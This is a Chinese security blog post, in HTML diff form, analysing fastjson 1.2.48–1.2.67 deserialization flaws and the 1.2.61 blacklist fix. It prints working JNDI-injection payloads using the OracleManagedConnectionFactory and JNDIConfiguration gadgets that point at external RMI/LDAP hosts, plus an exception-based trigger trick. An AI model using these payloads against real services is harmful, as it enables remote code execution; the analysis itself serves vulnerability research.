@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="fastjson-004">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson 1.2.48-1.2.67漏洞分析">
+<meta property="og:url" content="http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="九指 | [ninefiger&#39;s blog]">
+<meta property="og:description" content="fastjson-004">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/1.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/2.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/3.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/4.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/5.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/6.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/7.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/8.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/9.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/10.png">
+<meta property="article:published_time" content="2022-11-11T06:03:00.000Z">
+<meta property="article:modified_time" content="2022-11-11T08:43:52.045Z">
+<meta property="article:author" content="ninefiger">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ninefiger.top/img/fastjson%201.2.48-1.2.67漏洞分析/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>fastjson 1.2.48-1.2.67漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="九指 | [ninefiger&#39;s blog]" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2022/11/11/fastjson%201.2.25-1.2.47%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson 1.2.48-1.2.67漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.48-1.2.67漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%92%88%E5%AF%B91-2-47%E9%97%AE%E9%A2%98%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.</span> <span class="toc-text">1. 针对1.2.47问题的修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 新的利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-OracleManagedConnectionFactory"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 OracleManagedConnectionFactory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 触发点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A7%A6%E5%8F%91%E9%93%BEgetLogWriter"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 触发链getLogWriter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-%E5%A6%82%E4%BD%95%E8%87%AA%E5%8A%A8%E8%A7%A6%E5%8F%91"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3 如何自动触发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-org-apache-commons-configuration-JNDIConfiguration"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 org.apache.commons.configuration.JNDIConfiguration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 触发点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-Poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 Poc构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E9%97%AE%E9%A2%98"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-2-61%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 1.2.61修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-%E8%BF%9B%E5%85%A5checkAutoType%E4%B9%8B%E5%89%8D"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 进入checkAutoType之前</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-Hash%E8%AE%A1%E7%AE%97"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.3 Hash计算</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        fastjson 1.2.48-1.2.67漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ninefiger</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-11T06:03:00.000Z" itemprop="datePublished">2022-11-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/fastjson/" rel="tag">fastjson</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>版本：1.2.48-1.2.60</p>
+</blockquote>
+<h2 id="1-针对1-2-47问题的修复"><a href="#1-针对1-2-47问题的修复" class="headerlink" title="1. 针对1.2.47问题的修复"></a>1. 针对1.2.47问题的修复</h2><p>首先<code>checkAutoType</code>方法中，从之前几个版本开始，黑白名单的校验通过<code>hash</code>对比来处理，有效的防止大家针对黑名单去绕过<br>使用<code>&#123;&quot;@type&quot;: &quot;java.lang.Class&quot;&#125;</code>调试，发现在黑名单校验处抛出异常了，说明<code>Class</code>类已经被拉黑了</p>
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/1.png" alt="1" style="zoom:50%;" /></div>
+
+
+<h2 id="2-新的利用链"><a href="#2-新的利用链" class="headerlink" title="2. 新的利用链"></a>2. 新的利用链</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="attr">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="attr">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>有师傅在这两个类中找到了<code>jndi</code>的相关利用链，不得不记录下github上自动扫描类去寻找相关关键字的脚本<br><a target="_blank" rel="noopener" href="https://github.com/Lonely-night/fastjson_gadgets_scanner">https://github.com/Lonely-night/fastjson_gadgets_scanner</a><br><a target="_blank" rel="noopener" href="https://github.com/H3rmesk1t/Fastjson-Gadgets-Automatic-Scanner">https://github.com/H3rmesk1t/Fastjson-Gadgets-Automatic-Scanner</a></p>
+<h3 id="2-1-OracleManagedConnectionFactory"><a href="#2-1-OracleManagedConnectionFactory" class="headerlink" title="2.1 OracleManagedConnectionFactory"></a>2.1 OracleManagedConnectionFactory</h3><blockquote>
+<p>这个依赖用于Java程序连接Oracle数据库的驱动，即<code>ojdbc</code></p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.oracle.database.jdbc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ojdbc10<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>19.10.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-1-1-触发点"><a href="#2-1-1-触发点" class="headerlink" title="2.1.1 触发点"></a>2.1.1 触发点</h4><p><code>oracle.jdbc.connector.OracleManagedConnectionFactory#setupXADataSource</code>，参数是<code>xaDataSourceName</code></p>
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/2.png" alt="2" style="zoom:50%;" /></div>
+
+<h4 id="2-1-2-触发链getLogWriter"><a href="#2-1-2-触发链getLogWriter" class="headerlink" title="2.1.2 触发链getLogWriter"></a>2.1.2 触发链getLogWriter</h4><p>如图，在<code>getLogWriter</code>中，调用了<code>setupXADataSource()</code>；但是<code>getLogWriter()</code>如何触发呢，</p>
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/3.png" alt="3" style="zoom:50%;" /></div>
+
+<h4 id="2-1-3-如何自动触发"><a href="#2-1-3-如何自动触发" class="headerlink" title="2.1.3 如何自动触发"></a>2.1.3 如何自动触发</h4><p>这里想到之前<code>BCEL</code>的<code>poc</code>构造，结合<code>com.alibaba.fastjson.JSONObject</code>去触发<code>get</code>方法请求 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;   </span><br><span class="line">  &#123;</span><br><span class="line">  	&quot;x&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://488.9ktn7r.ai.haibara.cyou/1&quot;&#125;</span><br><span class="line">	&#125;: &quot;&quot;b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是此处触发和<code>1.2.24</code>不同<br>在<code>DefaultJSONParser</code>中，当<code>object</code>是<code>JSONObject</code>类型时，不再执行<code>toString</code></p>
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/4.png" alt="4" style="zoom:50%;" /></div>
+
+<p>但是当我们指定 <code>&#123;&#125;:&quot;&quot;</code>，这里会抛出异常</p>
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/5.png" alt="5" style="zoom:50%;" /></div>
+
+<p><code>Java的&quot;aaa&quot; + &quot;bbb&quot; + new Student()</code></p>
+<p>前面的字符串会使用<code>StringBuilder.append</code>拼接，拼接中的对象会调用<code>toString</code>方法</p>
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/6.png" alt="6" style="zoom:50%;" /></div>
+
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/7.png" alt="7" style="zoom:50%;" /></div>
+剩下的流程就和BCEL中最后`invoke` `get`方法一样了
+
+<hr>
+<p><strong>思路：通过构造</strong><code>**&quot;&quot;xxx**</code><strong>这种json字段，</strong><code>**value**</code><strong>的JSON解析抛出异常，触发</strong><code>**key.toString**</code></p>
+<hr>
+<h3 id="2-2-org-apache-commons-configuration-JNDIConfiguration"><a href="#2-2-org-apache-commons-configuration-JNDIConfiguration" class="headerlink" title="2.2 org.apache.commons.configuration.JNDIConfiguration"></a>2.2 org.apache.commons.configuration.JNDIConfiguration</h3><p>这个组件是<code>Apache</code>开源组织提供的用于操作配置文件的工具包</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="attr">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="2-2-1-触发点"><a href="#2-2-1-触发点" class="headerlink" title="2.2.1 触发点"></a>2.2.1 触发点</h4><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/8.png" alt="8" style="zoom:50%;" /></div>
+
+<h4 id="2-2-2-Poc构造"><a href="#2-2-2-Poc构造" class="headerlink" title="2.2.2 Poc构造"></a>2.2.2 Poc构造</h4><p>和<code>ojdbc</code>的利用链一样，通过触发<code>JSONException</code>，利用<code>JSONObject.toString()</code>触发getXXX方法执行</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://eeee.9ktn7r.ai.haibara.cyou&quot;&#125;</span><br><span class="line">	&#125;:&quot;&quot;a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-3-问题"><a href="#2-3-问题" class="headerlink" title="2.3 问题"></a>2.3 问题</h3><p>这个利用方法并没有绕过<code>AutoTypeSupport</code>问题，需要手动开启</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-1-2-61修复"><a href="#2-4-1-2-61修复" class="headerlink" title="2.4 1.2.61修复"></a>2.4 1.2.61修复</h3><h4 id="2-4-1-进入checkAutoType之前"><a href="#2-4-1-进入checkAutoType之前" class="headerlink" title="2.4.1 进入checkAutoType之前"></a>2.4.1 进入checkAutoType之前</h4><div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/9.png" alt="9" style="zoom:50%;" /></div>
+#### 2.4.2 两个利用链的类被加入了黑名单的hash中
+<div align=center><img src="/img/fastjson 1.2.48-1.2.67漏洞分析/10.png" alt="10" style="zoom:50%;" /></div>
+
+<h4 id="2-4-3-Hash计算"><a href="#2-4-3-Hash计算" class="headerlink" title="2.4.3 Hash计算"></a>2.4.3 Hash计算</h4><p>去除计算代码，看下的是什么黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String className = <span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>;</span><br><span class="line"><span class="keyword">long</span> h3 = (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="keyword">long</span> hash;</span><br><span class="line"><span class="keyword">int</span> mask;</span><br><span class="line">    hash = h3;</span><br><span class="line">    <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">        hash ^= (<span class="keyword">long</span>)className.charAt(mask);</span><br><span class="line">        hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">        System.out.println(mask);</span><br><span class="line">        System.out.println(className.charAt(mask));</span><br><span class="line">        System.out.println(className.substring(<span class="number">0</span>, mask + <span class="number">1</span>));</span><br><span class="line">        System.out.println(hash);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">49</span><br><span class="line">n</span><br><span class="line">org.apache.commons.configuration.JNDIConfiguration</span><br><span class="line">8925522461579647174</span><br></pre></td></tr></table></figure>
+<p>看来是把整个包路径+类名都加进去了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%92%88%E5%AF%B91-2-47%E9%97%AE%E9%A2%98%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.</span> <span class="toc-text">1. 针对1.2.47问题的修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 新的利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-OracleManagedConnectionFactory"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 OracleManagedConnectionFactory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 触发点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A7%A6%E5%8F%91%E9%93%BEgetLogWriter"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 触发链getLogWriter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-%E5%A6%82%E4%BD%95%E8%87%AA%E5%8A%A8%E8%A7%A6%E5%8F%91"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3 如何自动触发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-org-apache-commons-configuration-JNDIConfiguration"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 org.apache.commons.configuration.JNDIConfiguration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 触发点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-Poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 Poc构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E9%97%AE%E9%A2%98"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-2-61%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 1.2.61修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-%E8%BF%9B%E5%85%A5checkAutoType%E4%B9%8B%E5%89%8D"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 进入checkAutoType之前</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-Hash%E8%AE%A1%E7%AE%97"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.3 Hash计算</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.48-1.2.67漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
